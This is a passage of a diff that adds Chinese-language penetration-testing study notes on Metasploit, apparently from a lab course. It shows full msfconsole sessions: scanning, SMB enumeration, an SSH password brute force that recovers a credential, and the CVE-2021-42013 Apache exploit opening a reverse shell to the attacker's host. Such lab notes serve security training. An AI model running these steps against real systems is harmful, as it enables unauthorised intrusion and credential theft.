@@ -995,3 +995,527 @@ do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUS
 Unable to connect with SMB1 -- no workgroup available
 ```
 # The Metasploit Framework
+尋找公開的 Exploit（漏洞利用代碼）並利用並不容易，Exploit Framework 整合各種 Exploit，並提供統一的使用方式，減少手動調整。\
+透過 framework 中的 exploit，有效利用各種 payloads\
+
+目前市面上有許多 Exploit 和後滲透框架:
+- [Metasploit](https://www.metasploit.com/)
+- [Covenant](https://github.com/cobbr/Covenant)
+- [Cobalt Strike](https://www.cobaltstrike.com/)
+- [PowerShellEmpire](https://github.com/BC-SECURITY/Empire)
+
+Metasploit Framework 由 [Rapid7](https://www.rapid7.com/) 維護:
+- 內建大量的 Exploit，涵蓋各種系統與應用程式漏洞。
+- 包含輔助模組（Auxiliary Modules），可用於掃描、訊息收集與其他安全測試。
+- 擁有多種動態 Payloads，可以根據需求選擇不同的攻擊方式。
+- 可以自動化測試與攻擊流程，減少手動操作。
+
+Kali Linux 預設已經安裝了 [metasploit-framework](https://www.kali.org/tools/metasploit-framework/) 套件
+
+## Getting Familiar with Metasploit
+熟悉 Metasploit Framework (MSF)，使用 Auxiliary [Modules](https://docs.rapid7.com/metasploit/modules/)
+### Setup and Work with MSF
+#### 1. 初始化 MSF database
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo msfdb init
+[sudo] password for chw: 
+[+] Starting database
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+```
+#### 2. 啟動 PostgreSQL DB
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo systemctl enable postgresql
+Synchronizing state of postgresql.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.
+Executing: /usr/lib/systemd/systemd-sysv-install enable postgresql
+Created symlink '/etc/systemd/system/multi-user.target.wants/postgresql.service' → '/usr/lib/systemd/system/postgresql.service'.
+```
+#### 3. 啟動 Metasploit cmd line interface
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo msfconsole                        
+[sudo] password for chw: 
+Metasploit tip: Save the current environment with the save command, 
+future console restarts will use this environment again
+...
+       =[ metasploit v6.4.18-dev                          ]
++ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]
++ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 >
+```
+> 啟動畫面，其中包含：\
+>- 可用的 Exploit（漏洞利用）
+>- 輔助模組（Auxiliary Modules）
+>- Post-Exploitation（後滲透）
+>- Payload（攻擊載荷）
+>- 編碼器（Encoders）
+>- 反偵測模組（Evasion）
+>> `sudo msfconsole -q`:不顯示內容
+
+#### 4. 連線 PostgreSQL 資料庫
+```
+msf6 > db_status
+[*] Connected to msf. Connection type: postgresql.
+```
+> Metasploit 已經與 PostgreSQL 連接成功
+
+#### - 熟悉 Metasploit 的命令
+```
+msf6 > help
+
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    ...
+
+Module Commands
+===============
+
+    Command       Description
+    -------       -----------
+    ...
+    search        Searches module names and descriptions
+    show          Displays modules of a given type, or all modules
+    use           Interact with a module by name or search term/index
+
+    
+Job Commands
+============
+
+    Command       Description
+    -------       -----------
+    ...
+
+Resource Script Commands
+========================
+
+    Command       Description
+    -------       -----------
+    ...
+
+Database Backend Commands
+=========================
+
+    Command           Description
+    -------           -----------
+    ...
+    db_nmap           Executes nmap and records the output automatically
+    ...
+    hosts             List all hosts in the database
+    loot              List all loot in the database
+    notes             List all notes in the database
+    services          List all services in the database
+    vulns             List all vulnerabilities in the database
+    workspace         Switch between database workspaces
+
+Credentials Backend Commands
+============================
+
+    Command       Description
+    -------       -----------
+    creds         List all credentials in the database
+    
+Developer Commands
+==================
+
+    Command       Description
+    -------       -----------
+    ...
+```
+#### - 使用 Workspace 管理不同的測試專案
+- 查看當前的 Workspace
+```
+msf6 > workspace
+* default
+```
+- 建立新 Workspace
+建立一個名為 pen200 的工作區
+```
+msf6 > workspace -a pen200
+[*] Added workspace: pen200
+[*] Workspace: pen200
+msf6 > workspace
+  default
+* pen200
+```
+#### - 使用 Nmap 掃描目標並儲存結果
+Metasploit 內建了一個 db_nmap 指令，它可以直接使用 Nmap 掃描目標，並自動將結果存入資料庫。
+```
+msf6 > db_nmap
+[*] Usage: db_nmap [--save | [--help | -h]] [nmap options]
+msf6 > db_nmap -A 192.168.226.202
+[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 03:48 EDT
+[*] Nmap: Nmap scan report for 192.168.50.202
+[*] Nmap: Host is up (0.11s latency).
+[*] Nmap: Not shown: 993 closed tcp ports (reset)
+[*] Nmap: PORT     STATE SERVICE       VERSION
+[*] Nmap: 21/tcp   open  ftp?
+...
+[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
+[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+[*] Nmap: 445/tcp  open  microsoft-ds?
+[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
+...
+[*] Nmap: 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+...
+[*] Nmap: 8000/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+...
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 67.72 seconds
+msf6 >
+```
+- 查看掃描到的主機: host
+```
+msf6 > hosts                                                                             
+Hosts                                                                                                             
+=====                                                                                                
+address          mac  name  os_name       os_flavor  os_sp  purpose  info  comments                               
+-------          ---  ----  -------       ---------  -----  -------  ----  --------                               
+192.168.226.202             Windows 2016                    server
+```
+- 查看掃描到的服務: services
+```
+msf6 > services                                                                                                   
+Services                                                                                                          
+========
+
+host             port  proto  name           state  info
+----             ----  -----  ----           -----  ----
+192.168.226.202  21    tcp    ftp            open   FileZilla ftpd 1.4.1
+192.168.226.202  135   tcp    msrpc          open   Microsoft Windows RPC
+192.168.226.202  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
+192.168.226.202  445   tcp    microsoft-ds   open
+192.168.226.202  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
+192.168.226.202  5985  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+192.168.226.202  8000  tcp    http           open   Golang net/http server Go-IPFS json-rpc or InfluxDB API
+
+msf6 > services -p 8000
+```
+
+#### - 了解 Metasploit 模組
+Metasploit 內建數千個模組，可以透過 `show` 指令查看:
+```
+msf6 > show -h
+[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
+[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
+```
+> 顯示模組的類別
+
+如果要使用某個模組，例如 `auxiliary/scanner/portscan/tcp`：
+```
+msf6 > use auxiliary/scanner/portscan/tcp
+```
+
+### Auxiliary Modules
+MSF 的 Auxiliary Modules 提供:\
+👉🏻 資訊收集（Information Gathering）（gather/）\
+👉🏻 端口掃描（Port Scanning）（scanner/）\
+👉🏻 協議枚舉（Protocol Enumeration）（如 SMB、FTP、SSH）\
+👉🏻 密碼攻擊（Password Attacks）\
+👉🏻 模糊測試（Fuzzing）\
+👉🏻 封包攔截（Sniffing）\
+等其他功能
+
+兩個最常見的 Auxiliary Modules 的語法和操作
+#### - 列出所有 Modules
+```
+msf6 > show auxiliary
+
+Auxiliary
+=========
+
+   #     Name                                                                     Disclosure Date  Rank    Check  Description
+   -     ----                                                                     ---------------  ----    -----  -----------
+   0     auxiliary/admin/2wire/xslt_password_reset                                2007-08-15       normal  No     2Wire Cross-Site Request Forgery Password Reset Vulnerability
+   1     auxiliary/admin/android/google_play_store_uxss_xframe_rce                .                normal  No     Android Browser RCE Through Google Play Store XFO
+   2     auxiliary/admin/appletv/appletv_display_image                            .                normal  No     Apple TV Image Remote Control
+   3     auxiliary/admin/appletv/appletv_display_video                            .                normal  No
+...
+   1252  auxiliary/vsploit/malware/dns/dns_zeus                                   .                normal  No     VSploit Zeus DNS Query Module
+   1253  auxiliary/vsploit/pii/email_pii                                          .                normal  No     VSploit Email PII
+   1254  auxiliary/vsploit/pii/web_pii                                            .                normal  No     VSploit Web PII
+```
+#### - 搜尋特定的 Modules
+使用 search 篩選
+```
+msf6 > search type:auxiliary smb
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank    Check  Description
+   -  ----                                              ---------------  ----    -----  -----------
+   ...
+   52  auxiliary/scanner/smb/smb_enumshares                                             normal  No     SMB Share Enumeration
+   53  auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                   normal  No     SMB Tree Connect Request Corruption
+   54  auxiliary/fuzzers/smb/smb_tree_connect                                           normal  No     SMB Tree Connect Request Fuzzer
+   55  auxiliary/scanner/smb/smb_enumusers                                              normal  No     SMB User Enumeration (SAM EnumUsers)
+   56  auxiliary/scanner/smb/smb_version                                                normal  No     SMB Version Detection
+   ...
+
+
+Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access
+```
+#### - 啟用特定的 Modules
+可以使用 `use` 來啟動
+```
+msf6 > use auxiliary/scanner/smb/smb_version
+```
+或直接使用 index
+```
+msf6 > use 56
+```
+成功啟用後：
+```
+msf6 auxiliary(scanner/smb/smb_version) >
+```
+#### - 查看 Modules 資訊
+啟用模組後，使用 `info` 查看詳細資訊
+```
+msf6 auxiliary(scanner/smb/smb_lookupsid) > info
+
+       Name: SMB SID User Enumeration (LookupSid)
+     Module: auxiliary/scanner/smb/smb_lookupsid
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  hdm <x@hdm.io>
+
+Available actions:
+    Name    Description
+    ----    -----------
+=>  DOMAIN  Enumerate domain accounts
+    LOCAL   Enumerate local accounts
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  MaxRID  4000             no        Maximum RID to check
+  MinRID  500              no        Starting RID to check
+
+
+  Used when connecting via an existing SESSION:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SESSION                   no        The session to run this module on
+
+
+  Used when making a new connection via RHOSTS:
+
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploi
+                                        t/basics/using-metasploit.html
+  RPORT      445              no        The target port (TCP)
+  SMBDomain  .                no        The Windows domain to use for authentication
+  ...
+```
+`show options` 來顯示 Modules 的選項
+```
+msf6 auxiliary(scanner/smb/smb_version) > show options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host(s)...
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+```
+> 顯示 options `RHOSTS` 沒有設定值但是模組需要用到
+#### - 設定 Modules 參數
+使用 `set` 和 `unset` 從選項中新增或刪除值
+```
+msf6 auxiliary(scanner/smb/smb_lookupsid) > set RHOSTS 192.168.226.202
+RHOSTS => 192.168.226.202
+msf6 auxiliary(scanner/smb/smb_lookupsid) > unset RHOSTS
+Unsetting RHOSTS...
+```
+但我們不需要手動設定 IP，如果已經使用 db_nmap 掃描過，可以讓 Metasploit 自動設定
+```
+msf6 auxiliary(scanner/smb/smb_lookupsid) > services -p 445 --rhosts
+```
+#### - 啟動 Modules
+```
+msf6 auxiliary(scanner/smb/smb_lookupsid) > run
+
+[!] 192.168.226.202:445 - Unable to authenticate ([Rex::Proto::SMB::Exceptions::LoginError] Login Failed: (0xc0000022) STATUS_ACCESS_DENIED: {Access Denied} A process has requested access to an object but has not been granted those access rights.).
+
+SMB Lookup SIDs Output
+======================
+
+    Type  Name  RID
+    ----  ----  ---
+
+[*] 192.168.226.202: - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+#### - 檢查漏洞
+使用 `vulns` 指令來檢查是否發現漏洞
+```
+msf6 auxiliary(scanner/smb/smb_version) > vulns
+
+Vulnerabilities
+===============
+
+Timestamp                Host            Name                         References
+---------                ----            ----                         ----------
+2022-07-28 10:17:41 UTC  192.168.50.202  SMB Signing Is Not Required  URL-https://support.microsoft.com/en-us/help/161372/how-to-enable-smb-signing-in-windows-nt,URL-https://support.microsoft.com/en-us/help/88
+                                                                      7429/overview-of-server-message-block-signing
+```
+> [SMB Signing is not required](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing) 相關漏洞 
+
+更換 SSH module
+```
+msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh
+msf6 auxiliary(scanner/smb/smb_lookupsid) > use 15
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.201
+msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+```
+`creds` 查看可用的憑證
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > creds
+Credentials
+===========
+
+host            origin          service       public  private    realm  private_type  JtR Format
+----            ------          -------       ------  -------    -----  ------------  ----------
+192.168.226.201  192.168.226.201  2222/tcp (ssh)  george  chocolate         Password 
+```
+### Exploit Modules
+[環境範例]
+假設我們發現目標系統 WEB18 運行的是 Apache 2.4.49，並且透過漏洞掃描工具確認它 容易受到 CVE-2021-42013 攻擊，我們希望使用 Metasploit 來攻擊它並獲取存取權限。
+#### 1. 搜尋適合的 Exploit Modules
+```
+msf6 > workspace -a exploits
+[*] Added workspace: exploits
+[*] Workspace: exploits
+msf6 > search Apache 2.4.49
+
+Matching Modules
+================
+
+   #  Name                                          Disclosure Date  Rank       Check  Description
+   -  ----                                          ---------------  ----       -----  -----------
+   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
+   1    \_ target: Automatic (Dropper)              .                .          .      .
+   2    \_ target: Unix Command (In-Memory)         .                .          .      .
+   3  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner
+   4    \_ action: CHECK_RCE                        .                .          .      Check for RCE (if mod_cgi is enabled).
+   5    \_ action: CHECK_TRAVERSAL                  .                .          .      Check for vulnerability.
+   6    \_ action: READ_FILE                        .                .          .      Read file on the remote server.
+```
+> 列出兩個 Module: `exploit` 與 `auxiliary`
+
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > use 0
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > info
+
+       Name: Apache 2.4.49/2.4.50 Traversal RCE
+     Module: exploit/multi/http/apache_normalize_path_rce
+   Platform: Unix, Linux
+       Arch: cmd, x64, x86
+...
+Module side effects:
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic (Dropper)
+  1   Unix Command (In-Memory)
+
+Check supported:
+  Yes
+...
+
+```
+> - 這個 Exploit 可以攻擊 Apache 2.4.49/2.4.50，並 RCE\
+> - 支援 Unix 和 Linux 平台，適用於 x86 和 x64 架構\
+> - 可能會留下攻擊痕跡（ioc-in-logs）並在磁碟上產生攻擊檔案（artifacts-on-disk）。
+> - 可以多次執行，不會影響目標穩定性（repeatable-session）。
+> - 可以使用 check 指令來驗證目標是否真的存在漏洞。
+
+#### 2. 設定 Exploit 參數
+查看可用參數
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > show options
+```
+> `RHOSTS（目標 IP）`：需要設定\
+`RPORT（目標端口）`：預設為 443（HTTPS），但我們需要設定為 80（HTTP）\
+`LHOST（攻擊者 IP）`：需要設定為自己的機器
+
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > set payload payload/linux/x64/shell_reverse_tcp
+msf6 exploit(multi/http/apache_normalize_path_rce) > show options
+msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.226.16
+msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.45.230
+```
+#### 3. 執行 Exploit 並獲取存取權限
+
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > run
+
+[*] Started reverse TCP handler on 192.168.45.230:4444 
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] http://192.168.226.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] http://192.168.226.16:80 - Attempt to exploit for CVE-2021-42013
+[*] http://192.168.226.16:80 - Sending linux/x64/shell_reverse_tcp command payload
+[*] Command shell session 1 opened (192.168.45.230:4444 -> 192.168.226.16:34948) at 2025-03-06 15:15:49 -0500
+[!] This exploit may require manual cleanup of '/tmp/RireZM' on the target
+
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+```
+> 成功以低權限 daemon 存取該系統
+
+#### - 管理與回到 Session
+`Ctrl + X` 可以將當前 session 移至背景執行\
+使用 `sessions -l` 查看所有 active session，並用 `sessions -i {index}` 回到 session
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type             Information  Connection
+  --  ----  ----             -----------  ----------
+  1         shell x64/linux               192.168.45.230:4444 -> 192.168.226.16:34948 (192.168.226.16)
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 1
+[*] Starting interaction with 1...
+
+```
+
+## Using Metasploit Payloads
